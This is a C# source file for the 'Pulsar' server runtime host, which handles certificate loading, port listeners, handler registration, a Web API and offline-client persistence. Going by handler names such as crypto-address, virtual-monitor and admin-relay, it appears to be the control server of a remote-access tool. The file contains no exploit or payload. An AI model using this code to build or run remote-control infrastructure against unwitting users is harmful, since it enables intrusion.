using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Other;
using Pulsar.Server.Messages;
using Pulsar.Server.Models;
using Pulsar.Server.Networking.WebApi;
using Pulsar.Server.Operations;
using Pulsar.Server.Persistence;

namespace Pulsar.Server.Networking
{
    /// <summary>
    /// Owns the shared server runtime lifecycle for the WPF shell: certificate load,
    /// PulsarServer listener lifecycle, core MessageHandler registrations, Web API,
    /// offline-client persistence, and auditable cleanup. WinForms remains the default UI shell.
    /// </summary>
    public sealed class ServerRuntimeHost : IDisposable
    {
        private readonly StartupOptions _options;
        private readonly ClientOperationService _operations;
        private readonly ClientStatusHandler _clientStatusHandler;
        private readonly GetCryptoAddressHandler _cryptoHandler;
        private readonly ClientDebugLog _debugLogHandler;
        private readonly QueryHandler _queryHandler;
        private readonly DeferredAssemblyHandler _deferredAssemblyHandler;
        private readonly UniversalPluginResponseHandler _universalPluginResponseHandler;
        private readonly VirtualMonitorHandler _virtualMonitorHandler;
        private readonly AdminRelayHandler _adminRelayHandler;
        private readonly Action<string, string> _audit;
        private readonly string _autoTasksPath;
        private WebApiServer _webApiServer;

        public PulsarServer Server { get; private set; }
        public ClientOperationService Operations => _operations;
        public bool Listening => Server?.Listening == true;
        public IReadOnlyList<ushort> ListeningPorts => Server?.GetListeningPorts() ?? Array.Empty<ushort>();

        public event EventHandler<string> StartupError;

        public ServerRuntimeHost(StartupOptions options, Action<string, string> audit = null, string pulsarStuffDirectory = null)
        {
            _options = options ?? throw new ArgumentNullException(nameof(options));
            _audit = audit;
            string stuffDir = string.IsNullOrWhiteSpace(pulsarStuffDirectory)
                ? Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "PulsarStuff")
                : pulsarStuffDirectory;
            _autoTasksPath = Path.Combine(stuffDir, "autotasks.json");

            _operations = new ClientOperationService(() => Server?.ConnectedClients ?? Array.Empty<Client>(), _audit);
            _clientStatusHandler = new ClientStatusHandler();
            _cryptoHandler = new GetCryptoAddressHandler();
            _debugLogHandler = new ClientDebugLog();
            _queryHandler = new QueryHandler();
            _deferredAssemblyHandler = new DeferredAssemblyHandler();
            _universalPluginResponseHandler = new UniversalPluginResponseHandler();
            _virtualMonitorHandler = new VirtualMonitorHandler();
            _adminRelayHandler = new AdminRelayHandler(() => Server, _audit, _operations);

            RegisterCoreHandlers();
        }

        public void Initialize()
        {
            if (Server != null)
            {
                return;
            }

            OfflineClientRepository.Initialize();
            OfflineClientRepository.ResetOnlineState();

            X509Certificate2 certificate = LoadCertificate();
            Server = new PulsarServer(certificate);
            _audit?.Invoke("Pulsar server runtime initialized for WPF shell.", "normal");
        }

        public void StartConfiguredServices()
        {
            Initialize();

            if ((_options.ListenImmediately || Settings.AutoListen) && !_options.DisableAutoListen)
            {
                StartListening();
            }

            if (Settings.WebApiEnabled && !_options.DisableWebApi)
            {
                StartWebApi();
            }
        }

        public bool StartListening()
        {
            if (Server == null)
            {
                return false;
            }

            if (Server.Listening)
            {
                return true;
            }

            try
            {
                var ports = new[] { Settings.ListenPort }
                    .Concat(Settings.ListenPorts ?? Array.Empty<ushort>())
                    .Where(port => port != 0)
                    .Distinct()
                    .ToArray();

                if (ports.Length == 0)
                {
                    RaiseStartupError("No valid listener ports are configured.");
                    return false;
                }

                Server.ListenMany(ports, Settings.IPv6Support, Settings.UseUPnP);
                _audit?.Invoke($"Listener started on ports: {string.Join(", ", ports)}.", "normal");
                return Server.Listening;
            }
            catch (SocketException ex)
            {
                RaiseStartupError(ex.ErrorCode == 10048
                    ? $"A configured listening port is already in use. ({ex.ErrorCode})"
                    : $"Socket error while starting listeners: {ex.Message} ({ex.ErrorCode})");
                try { Server.Disconnect(); } catch { }
                return false;
            }
            catch (Exception ex)
            {
                RaiseStartupError($"Failed to start listeners: {ex.Message}");
                try { Server.Disconnect(); } catch { }
                return false;
            }
        }

        public void StopListening()
        {
            try { Server?.Disconnect(); } catch { }
            _audit?.Invoke("Listener stopped by operator.", "normal");
        }

        private void StartWebApi()
        {
            try
            {
                _webApiServer?.Dispose();
                _webApiServer = new WebApiServer(_operations, (message, level) => _audit?.Invoke(message, level), _autoTasksPath, logCallbackPublishes: true);
                _webApiServer.Start(Settings.WebApiPort, Settings.WebApiKey);
                _audit?.Invoke($"Web API started on port {Settings.WebApiPort}.", "normal");
            }
            catch (Exception ex)
            {
                RaiseStartupError($"Web API failed to start: {ex.Message}");
            }
        }

        private X509Certificate2 LoadCertificate()
        {
#if DEBUG
            return new DummyCertificate();
#else
            if (!File.Exists(Settings.CertificatePath))
            {
                throw new FileNotFoundException(
                    "Server certificate was not found. Run the WinForms shell once to select or generate Pulsar.p12 before using the WPF shell.",
                    Settings.CertificatePath);
            }

            return X509CertificateLoader.LoadPkcs12FromFile(
                Settings.CertificatePath,
                password: null,
                X509KeyStorageFlags.Exportable | X509KeyStorageFlags.MachineKeySet);
#endif
        }

        private void RegisterCoreHandlers()
        {
            MessageHandler.Register(_clientStatusHandler);
            MessageHandler.Register(_cryptoHandler);
            MessageHandler.Register(_debugLogHandler);
            MessageHandler.Register(_queryHandler);
            MessageHandler.Register(_adminRelayHandler);
            MessageHandler.Register(_deferredAssemblyHandler);
            MessageHandler.Register(_universalPluginResponseHandler);
            MessageHandler.Register(_virtualMonitorHandler);
        }

        private void UnregisterCoreHandlers()
        {
            MessageHandler.Unregister(_clientStatusHandler);
            MessageHandler.Unregister(_cryptoHandler);
            MessageHandler.Unregister(_debugLogHandler);
            MessageHandler.Unregister(_queryHandler);
            MessageHandler.Unregister(_adminRelayHandler);
            MessageHandler.Unregister(_deferredAssemblyHandler);
            MessageHandler.Unregister(_universalPluginResponseHandler);
            MessageHandler.Unregister(_virtualMonitorHandler);

            try { _adminRelayHandler.Dispose(); } catch { }
            try { _universalPluginResponseHandler.Dispose(); } catch { }
        }

        private void RaiseStartupError(string message)
        {
            _audit?.Invoke(message, "error");
            StartupError?.Invoke(this, message);
        }

        public void Dispose()
        {
            if (Interlocked.Exchange(ref _disposedFlag, 1) != 0)
            {
                return;
            }

            try { _webApiServer?.Dispose(); } catch { }
            _webApiServer = null;
            try { Server?.Disconnect(); } catch { }
            UnregisterCoreHandlers();
        }

        private int _disposedFlag;
    }
}
